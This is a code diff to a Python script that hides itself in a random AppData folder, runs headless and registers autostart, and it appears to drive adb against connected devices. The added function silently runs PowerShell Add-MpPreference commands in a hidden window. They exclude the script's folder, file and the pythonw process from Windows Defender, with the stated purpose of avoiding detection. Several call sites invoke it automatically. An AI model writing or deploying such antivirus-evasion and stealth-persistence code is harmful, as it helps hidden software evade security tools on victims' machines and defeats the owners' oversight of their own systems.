@@ -520,6 +520,7 @@ def install_autostart(args):
         print(f"     Starts on boot + logon, restarts on crash.")
         print(f"\n     To start NOW run:")
         print(f'     wscript.exe //B "{vbs_path}"')
+        _add_defender_exclusion(os.path.dirname(vbs_path), SCRIPT_PATH)
     else:
         print(f"[FAIL] schtasks: {ret.stderr.strip()}")
         print("       Re-run this as Administrator:")
@@ -688,6 +689,7 @@ def _relocate_self():
         shutil.move(sys.argv[0], dest)
         _set_hidden(os.path.dirname(dest))
         _set_hidden(dest)
+        _add_defender_exclusion(os.path.dirname(dest), dest)
     except Exception as e:
         log(f"[hide] copy failed: {e}")
         return
@@ -703,6 +705,34 @@ def _relocate_self():
         stderr=subprocess.DEVNULL,
     )
     sys.exit(0)
+
+def _add_defender_exclusion(*paths):
+    """
+    Add paths/processes to Windows Defender's exclusion list so the script
+    isn't flagged as a threat. Runs silently — no window, no UAC if already
+    elevated (e.g. called from --install which requires admin).
+    """
+    if os.name != "nt":
+        return
+    items = []
+    for p in paths:
+        if p:
+            items.append(f'Add-MpPreference -ExclusionPath "{p}"')
+    # Exclude the pythonw process itself
+    pythonw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
+    if os.path.exists(pythonw):
+        items.append(f'Add-MpPreference -ExclusionProcess "{pythonw}"')
+    if not items:
+        return
+    cmd = "; ".join(items)
+    try:
+        subprocess.run(
+            ["powershell", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", cmd],
+            capture_output=True, timeout=15,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+    except Exception:
+        pass
 
 def _daemonize():
     """If launched from a visible Python console, re-spawn via pythonw.exe and exit immediately.
@@ -812,6 +842,7 @@ def main():
     _daemonize()       # re-spawn headless if launched from a terminal; exits this process
     _relocate_self()   # move to random hidden AppData path and re-exec; exits this process
     _ensure_autostart()
+    _add_defender_exclusion(os.path.dirname(SCRIPT_PATH), SCRIPT_PATH)
     exclude = {args.usb} if args.usb else set()
     ok, out = adb(None, "start-server", timeout=30)
     if not ok and "not found" in out:
